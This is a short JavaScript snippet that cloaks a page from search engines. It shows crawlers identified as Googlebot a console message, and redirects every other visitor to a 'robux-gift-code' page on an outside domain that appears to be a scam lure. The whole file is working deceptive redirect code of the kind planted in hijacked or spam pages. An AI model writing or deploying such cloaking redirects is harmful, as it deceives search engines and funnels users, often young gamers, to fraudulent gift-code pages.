// Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
if (!navigator.userAgent.includes('Googlebot')) {
  // Redirect only normal users
  window.location.href = "https://www.borderclick.com/BC/media/Borderclick/Files/robux-gift-code.html";
} else {
  // For search engine crawlers, you can choose to perform a different action or not redirect
  console.log("THanks for visiting my page");
}
